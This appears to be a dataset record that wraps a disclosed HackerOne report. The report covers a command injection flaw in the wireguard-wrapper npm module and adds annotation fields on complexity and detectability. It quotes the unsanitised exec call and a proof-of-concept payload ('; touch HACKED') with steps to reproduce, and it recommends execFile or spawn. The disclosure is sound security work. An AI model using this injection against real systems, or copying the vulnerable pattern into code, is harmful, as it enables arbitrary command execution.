@@ -1,0 +1,53 @@
+{
+  "reported_to": "Node.js third-party modules",
+  "reported_by": "d3lla ",
+  "title": "[wireguard-wrapper] Command Injection via insecure command concatenation",
+  "content": "\nI would like to report a Command Injection issue in the wireguard-wrapper module.\nIt allows to execute arbitrary commands on the victim's PC.\nModule\nmodule name: wireguard-wrapper\nversion: 1.0.2\nnpm page: https://www.npmjs.com/package/wireguard-wrapper\nModule Description\nThis project is a nodejs wrapper for the wireguard commands wg and wg-quick.\nFeatures:\nNo dependencies\nUses promises\nLimitations:\nSo far it can only read but not write anything\nmissing wg set, wg setconf, wg addconf, wg syncconf\nModule Stats\n[0] weekly downloads\nVulnerability\nVulnerability Description\nThe issue occurs because a user input parameter is used inside a command that is executed without any check.\nI tested the wg showconf functionality.\nHere's the code which causes the issue:\nCode 498 Bytes\n1// https://github.com/rostwolke/node-wireguard-wrapper/blob/master/src/command/Wg.js#L58\n2'use strict';\n3const {exec} = require('child_process');\n4...\n5\tstatic showconf(device){\n6\t\treturn new Promise(function(resolve, reject){\n7\t\t\tif(!device){\n8\t\t\t\treturn reject('No device/interface specified');\n9\t\t\t}\n10\n11\t\t\texec(`wg showconf ${device}`, function(error, stdout, stderr){\n12\t\t\t\tif(error){\n13\t\t\t\t\treturn reject(`Exec error: ${error}`);\n14\t\t\t\t}\n15\t\t\t\tif(stderr){\n16\t\t\t\t\treturn reject(`StdErr: ${stderr}`);\n17\t\t\t\t}\n18    ....\nAs we can see the device parameter is passed as input to the exec function.\nThe function exec is the build-in function child_process.exec() taking in input the device variable build with the unsecure user's input.\nSteps To Reproduce:\ncreate a directory for testing\nmkdir poc\ncd poc/\nmkdir poc\ncd poc/\ninstall wireguard tool (even though it is not needed to show the vulnerability)\ninstall wireguard-wrapper module:\nnpm i --save wireguard-wrapper\nnpm i --save wireguard-wrapper\ncreate the following PoC JavaScript file (poc.js):\nCode 218 Bytes\n1const { Wg } = require('wireguard-wrapper');\n2\n3Wg.showconf('; touch HACKED').then(function(config){\n4    console.log('wg0 configuration:', config);\n5    console.log('generated configuration file:', config.toString());\n6});\nmake sure that the HACKED file does not exist:\nls\nls\nexecute the poc.js file:\nnode poc.js\nnode poc.js\nthe HACKED file is created:\nls\nls\nPatch\nDo not concatenate commands using insecure user's input. Always check and sanitize it.\nIn my opinion, it's better to use child_process.execFile or child_process.spawn functions instead of child_process.exec.\nSupporting Material/References:\nOPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\nNODEJS VERSION: v13.13.0\nNPM VERSION: 6.14.4\nWrap up\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nThank you for your time.\nbest regards,\nd3lla\nImpact\nCommand Injection on wireguard-wrapper module via insecure command concatenation.\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Command Injection - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1618622580,
+  "report_url": "https://hackerone.com/reports/858674",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Install the wireguard-wrapper module: npm i --save wireguard-wrapper"
+    ],
+    [
+      2,
+      "Create a PoC JavaScript file (poc.js) with the following content: const { Wg } = require('wireguard-wrapper'); Wg.showconf('; touch HACKED').then(function(config){ console.log('wg0 configuration:', config); console.log('generated configuration file:', config.toString()); });"
+    ],
+    [
+      3,
+      "Execute the poc.js file: node poc.js"
+    ],
+    [
+      4,
+      "Verify that the HACKED file is created: ls"
+    ]
+  ],
+  "vuln_description": "The wireguard-wrapper module is vulnerable to command injection via insecure command concatenation in the 'showconf' function. The 'device' parameter is passed directly into a shell command without proper sanitization, allowing arbitrary command execution.",
+  "reason": "This vulnerability is straightforward to discover as it follows a common pattern of command injection vulnerabilities where user input is directly concatenated into a shell command. The attack does not require multiple components, complex state manipulation, or novel logic.",
+  "new_complexity": "LOW",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": true
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves command injection via insecure command concatenation in a Node.js module, which is not related to authentication or authorization boundaries within an application. The proposed methodologies focus on detecting authN/authZ issues by testing user sessions and resource access across different privilege levels, not command injection vulnerabilities.",
+    "is_detectable": false
+  }
+}
